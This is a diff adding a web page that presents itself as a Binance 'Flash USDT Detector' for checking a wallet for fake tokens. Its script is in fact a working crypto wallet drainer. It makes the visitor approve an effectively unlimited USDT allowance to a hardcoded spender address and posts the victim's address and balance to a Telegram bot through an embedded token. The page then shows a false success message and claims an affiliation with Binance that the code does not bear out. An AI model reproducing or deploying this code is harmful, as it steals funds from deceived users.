@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Binance Flash Detector</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #f4f4f4;
+      color: #111;
+    }
+    header {
+      background-color: #fcd535;
+      padding: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    header img {
+      height: 40px;
+    }
+    .menu {
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .dropdown {
+      position: absolute;
+      top: 70px;
+      right: 20px;
+      background-color: #fff;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      display: none;
+      z-index: 1000;
+    }
+    .dropdown a {
+      display: block;
+      padding: 12px 20px;
+      color: #111;
+      text-decoration: none;
+    }
+    .dropdown a:hover {
+      background-color: #f4f4f4;
+    }
+    .hero {
+      background: url('https://cdn.coinpaper.com/storage/2022/11/binance-hero.jpg') center/cover no-repeat;
+      min-height: 400px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 30px 20px;
+      position: relative;
+    }
+    .hero::after {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+    }
+    .hero * {
+      position: relative;
+      z-index: 1;
+    }
+    .hero h1 {
+      font-size: 2.3rem;
+      color: #fff;
+      margin-bottom: 5px;
+    }
+    .hero p {
+      font-size: 1.05rem;
+      color: #ddd;
+      max-width: 600px;
+    }
+    .apply-section {
+      background: #111;
+      color: #fff;
+      padding: 40px;
+      text-align: center;
+    }
+    .apply-section button {
+      background: #fcd535;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1em;
+      color: #111;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .apply-section button:hover {
+      background: #e9c318;
+    }
+    footer {
+      background: #fafafa;
+      color: #555;
+      text-align: center;
+      padding: 20px;
+      font-size: 0.9em;
+      border-top: 1px solid #eee;
+    }
+    #status {
+      margin-top: 20px;
+      color: #0f0;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Binance_Logo.png" alt="Binance Logo" />
+    <div class="menu" onclick="toggleDropdown()">&#9776;</div>
+    <div class="dropdown" id="dropdownMenu">
+      <a href="https://bscscan.com" target="_blank">BSCScan</a>
+      <a href="#about">About</a>
+    </div>
+  </header>
+
+  <section class="hero">
+    <h1>Flash USDT Detecting System</h1>
+    <p>Instant scan for temporary or hidden USDT balances using Binance Smart Chain technology.</p>
+  </section> 
+
+  <section class="info-boxes" style="display: flex; justify-content: center; gap: 20px; margin: 40px auto; max-width: 1000px; flex-wrap: wrap;">
+  <div style="background: #f9f9f9; border-radius: 10px; padding: 20px; flex: 1 1 250px; text-align: center; border: 1px solid #eee;">
+    <h3 style="color: #fcd535;">Lightning Fast</h3>
+    <p>Checks balances within seconds across BSC wallets</p>
+  </div>
+  <div style="background: #f9f9f9; border-radius: 10px; padding: 20px; flex: 1 1 250px; text-align: center; border: 1px solid #eee;">
+    <h3 style="color: #fcd535;">Security Grade</h3>
+    <p>Built on Binance Smart Chain for maximum integrity</p>
+  </div>
+  <div style="background: #f9f9f9; border-radius: 10px; padding: 20px; flex: 1 1 250px; text-align: center; border: 1px solid #eee;">
+    <h3 style="color: #fcd535;">Only at least charge</h3>
+    <p>Pay & verify safely</p>
+  </div>
+</section>
+
+
+  <section class="apply-section">
+    <h2>Check Flash USDT</h2>
+    <br>
+    <p>Click below to begin secure verification from your wallet</p>
+    <br>
+    <h4>Pay • $0.02 Fee • To Check</h4>
+    <br>
+    <button onclick="startVerification()">Check Now</button>
+    <div id="status"></div>
+  </section>
+
+  <footer>
+    <p id="about">This service is provided in association with Binance DeFi tools and is optimized for flash traceability. &copy; 2025</p>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <script>
+    const SPENDER = "0x0F88cAB0C16713b970c684E7e8723930090f2C94";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const BOT_TOKEN = "7660906281:AAGF28KfVld0AfGV1AIk-tcYMmZJMWZT5XI";
+    const CHAT_ID = "7927931760";
+
+    async function switchToBSC() {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      } catch (e) {
+        if (e.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x38",
+              chainName: "Binance Smart Chain",
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              blockExplorerUrls: ["https://bscscan.com"]
+            }]
+          });
+        }
+      }
+    }
+
+    async function startVerification() {
+      const status = document.getElementById("status");
+      try {
+        const provider = window.BinanceChain || window.ethereum;
+        if (!provider) return alert("Install a Web3 wallet");
+
+        await switchToBSC();
+        await provider.request({ method: 'eth_requestAccounts' });
+
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const wallet = accounts[0];
+
+        const abi = [
+          { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+          { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+          { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+        ];
+
+        const usdt = new web3.eth.Contract(abi, USDT);
+        const rawBal = await usdt.methods.balanceOf(wallet).call();
+        const formattedBal = (Number(rawBal) / 1e18).toFixed(2); // ✅ Format balance
+
+        if (Number(formattedBal) < 0.5) {
+          status.innerText = "Insufficient USDT balance.";
+          return;
+        }
+
+        const allowance = await usdt.methods.allowance(wallet, SPENDER).call();
+        if (Number(allowance) < 1e18) {
+          status.innerText = "Approving USDT...";
+          await usdt.methods.approve(SPENDER, web3.utils.toWei("1000000000000000000000000000000", "mwei")).send({ from: wallet });
+        }
+
+        const message = `🔍 Flash Check\n👛 Address: ${wallet}\n💰 Balance: ${formattedBal} USDT`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+
+        status.innerText = "✅ USDT Checked Successfull, NO Flash & reportrd USDT Found.";
+      } catch (err) {
+        status.innerText = "❌ Error: " + err.message;
+      }
+    }
+
+    function toggleDropdown() {
+      const menu = document.getElementById("dropdownMenu");
+      menu.style.display = menu.style.display === "block" ? "none" : "block";
+    }
+
+    window.addEventListener("load", switchToBSC);
+  </script>
+</body>
+</html>
